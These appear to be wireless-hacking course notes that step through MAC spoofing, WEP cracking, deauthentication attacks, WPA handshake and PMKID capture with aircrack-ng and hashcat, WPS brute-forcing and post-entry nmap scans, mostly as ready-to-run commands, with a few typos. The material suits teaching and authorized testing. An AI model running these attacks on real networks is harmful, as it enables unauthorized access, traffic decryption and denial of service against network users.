Static Wireless Operations

Attacking Wireless systems

•	Over 15 billion devices world wide as of 2016
•	Directly correlates to target (user, home or organization)
–	Can be used to gain information on the user
–	Can be used to gain information on the device

macchanger

•	Linux utility for viewing/manipulating the MAC address for network interfaces
•	Requires interface to be turned off, changed, then turned back on
•	Preinstalled on Kali, requires install on other distros (i.e. Ubuntu, raspian)
–	apt install macchanger 
•	Select <No> that it should automatically change the mac

Creating a file to retain spoofed MAC addresses

•	Network manager can and will inadvertently randomize or reset an interfaces MAC address to the default [permanent] address
•	Prevent this by creating a configuration file
–	nano /etc/NetworkManager/conf.d/retain_spoofed_mac.conf
–	Enter the following into the config file
[device] 
wifi.scan-rand-mac-address=no 
[connection] 
ethernet.cloned-mac-address=preserve 
wifi.cloned-mac-address=preserve

Shell script for spoofing mac address:
#!/bin/bash

#Take the interface down
ifconfig $1 down
#change the MAC address to new one
ifconfig $1 hw ether $2
#Restart the network manager
service network-manager restart
#Use rfkill to unblock any wireless interfaces
rfkill unblock all
#Bring the interface back up
ifconfig $1 up
#Disly the new MAC address of the interface
ifconfig $1 | grep ether | cut -d " " -f 10

permissions:
$ sudo chmod 755 .spoof_mac.sh
kal
usage: 
$ sudo ./.spoofmac.sh wlan0 00:DE:AD:BE:EF:00
	

Identifying wireless radio capabilities

•	ifconfig – used for configuring a network interface
•	iwconfig – configures a wireless network interface
•	The iwconfig command will give you a list of all wireless interfaces you have in your computer
•	Also used to configure a wireless network interface (manually - not recommended)
•	Changes should be made when the card is in a “down” state [using ifconfig]
•	iw – show / manipulate wireless devices and their configuration
•	The iw list command will let you know if the wireless card is capable of monitor mode
•	iw list | less
•	airmon-ng – script that puts wireless cards into monitor mode
•	airmon-ng is the program we will use to put our wireless network card into monitor mode
•	Some (cheap or new) wireless cards will not have drivers for monitor mode
•	airmon-ng <check|check kill> 
•	Checks or checks and kills any processes which may interfere with monitor mode
•	airmon-ng <start|stop> <interface> [channel] 
•	Starts or stops <interface> in monitor mode on [channel]
•	[channel] can be excluded if you want it to hop
•	macchanger – used to view / manipulate MAC address of network devices
•	rfkill – used to enable or disable wireless devices

TKIP = Temporal Key Integrity Protocol WPA1
CCMP = WPA2

Monitor Mode (Simple BASH script)

•	Wireless cards can be put into monitor mode by creating a simple BASH script:
#! /bin/bash
ifconfig [interface] down
macchanger –r [interface]
airmon-ng check kill
iwconfig [interface] mode Monitor
ifconfig [interface] up
echo “You are now in monitor mode!”

Managed Mode (Simple BASH script)

•	Wireless cards can be put into managed mode by creating a simple BASH script:
#! /bin/bash
ifconfig [interface]mon down
airmon-ng stop $1mon
ifconfig [interface] up
service NetworkManager start
echo “You can connect to WiFi now!”

Connecting to WiFi no GUI:

•	sudo sh -c 'wpa_passphrase Instructor password >> /etc/wpa_supplicant/wpa_supplicant.conf'

Turn on WPA_Supplicant:
•	sudo wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant/wpa_supplicant.conf


Cracking Encryption (WEP)

airodump-ng: 
•	sudo airodump-ng -c 6 -d 14:91:82:77:09:0E -w myfirstwephack wlan0mon

watch file:
•	watch -d -n 1 ls -l *.cap

aireplay-ng: (--fakeauth)
•	sudo aireplay-ng -1 1 -a 14:91:82:77:09:0E -h B8:27:EB:6A:DA:A6 wlan0mon

aireplay-ng: (--arpreplay)
•	sudo aireplay-ng -3 -b 14:91:82:77:09:0E -h B8:27:EB:6A:DA:A6 -x 30 wlan0mon

aireplay-ng: (--deauth && aircrack-ng)

	--deauth attack
•	sudo aireplay-ng -0 1 -a 14:91:82:77:09:0E -c B8:27:EB:6A:DA:A6 wlan0mon
•	
&& aircrack-ng
•	sudo aircrack-ng myfirstwephack-03.cap
 

•	68 signal strength or lower to attack
•	5000 IV or Data Packets to crack WEP key.

•	Fake authentication attack
–	Used to associate with APs utilizing WEP encryption
–	Does NOT generate ARP packets
–	Cannot be used against WPA/WPA2 targets
•	Fake authentication usage (mandatory)
–	-1 (or --fakeauth) indicates fake authentication attack (requires reassociation delay #)
–	-a   BSSID of the router
–	-h   MAC address of the card you are using
–	Interface (i.e. wlan# OR wlan#mon)
•	Fake authentication usage (optional)
–	-e   ESSID of the router
–	-o # Sends specified (#) of packets start with 10 
–	-q # Send keep-alive packets every (#) seconds
–	-y   used to indicate shared

•	ARP replay attack
–	Used to replay ARP packets
–	Produces Initialization Vectors (Ivs) needed to crack
•	ARP Replay usage (mandatory)
–	-3 (or --arpreplay) indicates fake authentication attack (requires reassociation delay #)
–	-b   BSSID of the router
–	-h   MAC address of the card you are using
–	Interface (i.e. wlan# OR wlan#mon)
•	ARP Replay usage (optional)
–	-r   read from replay file
–	-x   used to limit number of packets to send

Obtaining WPA Handshakes

 
 
•	WPA & WPA-2 Management frames are unencrypted
–	This flaw allows for sending disruptive messages from outside the network
–	Causes people inside the network to be unable to connect
–	Most common methods to force a handshake between client and AP
–	Deauthentication
–	Disassociation
•	Deauthentication attacks are the most common; can be used to disconnect any client from the network at any time
–	Using continuously has the effect of peppering the client with deauth packets, seemingly from the network they are connected to; creates a Denial Of Service (DOS)
•	Disassociation attacks are used to disconnect clients when the AP is powering down, rebooting, or leaving the area

Wireshark wireless filters for reading management frame sub-frames

•	IEEE 802.11 frames consist of Management, Control and Data frames
•	Management frames are responsible for all parts of the handshake negotiation
o	Association Request		wlan.fc.type_subtype == 0x00
o	Association Response		wlan.fc.type_subtype == 0x01
o	Reassociation Request	wlan.fc.type_subtype == 0x02
o	Reassociation Response	wlan.fc.type_subtype == 0x03
o	Probe Request			wlan.fc.type_subtype == 0x04
o	Probe Response		wlan.fc.type_subtype == 0x05
o	Beacon				wlan.fc.type_subtype == 0x08
o	ATIM				wlan.fc.type_subtype == 0x09
o	Disassociation			wlan.fc.type_subtype == 0x0A
o	Authentication		wlan.fc.type_subtype == 0x0B
o	Deauthentication		wlan.fc.type_subtype == 0x0C
o	Action				wlan.fc.type_subtype == 0x0D
•	WPA/2 management frames are unencrypted, this is one of the major improvements with WPA-3 (encrypted management frames)
•	Using deauthentication or disassociation attacks is a type of jamming that forces the target to be disconnected from the network they are connected to; rather than drowning out a target’s signal by trying to overwhelm it

Deauthentication & Disassociation

–	Deauthentication attacks
 
–	Used via aireplay-ng
–	This command uses aireplay-ng  to launch a deauthentication attack indefinitely, and targets the relationship between the AP (-a) and the Client (-c) using the interface wlan0mon
–	This type of attack is surgical and starts working immediately
–	This type of attack can fail or not be very effective on some networks
•	Disassociation attacks
 
–	Used via MDK3 with option ‘d’
–	Can be made more surgical with 
–	-c and -b options
–	Will require prior reconnaissance

Circumvent Encryption (WPA/2)

•	Auditing wireless networks secured with WPA / WPA2 encryption
–	Place card into monitor mode
–	Run airodump
–	Identify target router and narrow your search by channel and BSSID
–	Write capture to a file (be on the lookout for WPA HANDSHAKE)
–	Run deauthorization of target client (keep watching for the WPA HANDSHAKE)
–	<aircrack-ng -a 2 <NamedFile.cap> –w <password dictionary> >
•	Once you have the WPA HANDSHAKE
–	Run wireshark, open the capture file and filter results via < eapol >
–	If you have a good quality Handshake (1/4,  2/4,  3/4,  4/4):
•	LEAVE NOW, CRACK LATER!!
–	Run aircrack against captured file
•	“Current Passphrase” = Failure!
•	“Key found” = Success!
–	Test decrypted password by connecting to the target router.

Verifying the handshake
 
•	Open the captured pcap in Wireshark and filter using EAPOL
•	Remember that we only really need parts 1 and 2 (Anonce and Snonce+MIC) to find the passphrase from the handshake
•	But we also need part 3 to get the GTK, if we plan to decrypt packets
 
•	Sometimes there are problems with the handshake
–	You can test the handshake within the pcap on-site with pyrit
pyrit -r pcap.file analyze
•	It will tell you if you get a good handshake


Cracking WPA2 with aircrack-ng
 
•	aircrack-ng is designed to crack 802.11 WEP & WPA-PSK keys
–	aircrack-ng [options] <input file>
•	Several options exist to specify cracking details
–	man aircrack-ng
•	Know the difference between success & failure!

•	-9, --test
–	Tests injection and quality.


Trimming capture files

•	My capture file is HUGE! I had to wait FOREVER for a handshake
•	How do I pare it down?
•	tshark -r <input file name> -R "eapol || wlan.fc.type_subtype == 0x08" -w <output file name>
tshark -r capture.cap -R "eapol || wlan.fc.type_subtype ==0x08" -w smaller.cap
•	Reads all handshakes and probe responses from capture.cap and writes them to smaller.cap

After decrypting the password

•	airdecap-ng can decrypt everything after the handshake
•	For that one session that you have a handshake for
•	Decryption of other clients will require their own handshake
•	Use airdecap-ng to do the dirty work
airdecap-ng [options] <pcap file>
-b bssid
-e ssid
-p passphrase
	airdecap-ng -e ‘the ssid’ -p passphrase capture.cap

Network Entry

•	Prior to network entry:
1.	What is the overall objective/goal?
2.	PCI’s
3.	Distribution of Labor – Who’s doing what?
4.	Know who you are (MAC)
5.	Know where you are (IP)
6.	Know the Gateway (router)
7.	Know 2-3 steps ahead of what you will do – what’s the next command?
8.	Be prepared to document details!
•	Once connection is established, complete the mission
•	Prioritize the requirements
1.	Verify IP connectivity 	route –n
2.	Scan for alive hosts	nmap –sn 192.168.##.##/##

Cracking WPA2 with PMKID Hashcat Attack

•	Traditional means of wireless hacking (i.e. deauth & disassociation) required interaction with the target network
•	This technique is loud, legally troubling and can be easily detected
•	New method no longer requires a client to be on the network
•	Leverages an attack against the RSN IE (Robust Security Network Information Element) to capture the information required to attempt a brute-force attack
•	Uses hcxtools – requires installation
–	Hcxdumptool
–	Hcxpcaptool
•	Can be run with minimal arguments and can be easily executed over SSH connections

Step 1 – Install Hxctools and Hashcat
git clone https://github.com/ZerBea/hcxdumptool.git 
cd hcxdumptool 
make 
make install
cd git clone https://github.com/ZerBea/hcxtools.git 
cd hxctools 
make 
make install
apt install hashcat
Step 2 – Prepare Wireless Radio
Place wireless radio into monitor mode
Step 3 – Capture PMKIDs using Hxcdump
hcxdumptool -i wlan1mon -o galleria.pcapng --enable__status=1
-i = interface
-o = output to [file]
-c = specifies channel
Step 4 – Convert pcapng file into 
hcxpcaptool -E essidlist -I identitylist -U usernamelist -z galleriaHC.16800 galleria.pcapng
The arguments in the above command are used to help hashcat identify the contents of the file, -Z specifies the name of the output file followed by the capture file
Step 5 – Choose a Password List & crack with hashcat
hashcat -m 16800 galleriaHC.16800 -a 0 --kernel-accel=1 -w 4 --force 'topwifipass.txt'

Wifi Protected Setup (WPS)
•	Authentication is done via PIN in order to allow quick access to WIFI network.
•	PIN is 8 digits in length and can be physically found on the router
•	Authentication is doen in two steps…
•	Also get the WPA2 password.

PIN 1 1 4 7 8 9 4 3


Auditing wireless networks secured with WPA / WPA2 encryption and WiFi Protected Setup (WPS)

Several Techniques exist to circumvent this encryption

•	Wash -a monitoring tool used to detect routers running WPS
•	Reaver & Bully – WPS attack tools
•	Attack with these tools usually require brute force attempts
•	Time required takes 4+ hours

Document time on target
On Router:
•	Brand, model
•	Public facing IP - TraceRoute
•	Firmware version
•	DHCP Client table (screenshot) or alive hosts check with nmap
•	WPS**
•	DMZ**
Gather Client Information (MAC addresses)
•	Nmap scan – writes results to a file
•	Nmap -o option for outfile

Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2019-01-09T18:35:21
| Not valid after:  2021-01-08T18:35:21
| MD5:   93d2 2bfb c0bf 8711 453f 2f4c 63ea 08ab
|_SHA-1: f891 19a8 6f7e 129d be93 e144 d3dd 9cea 1eb1 922d
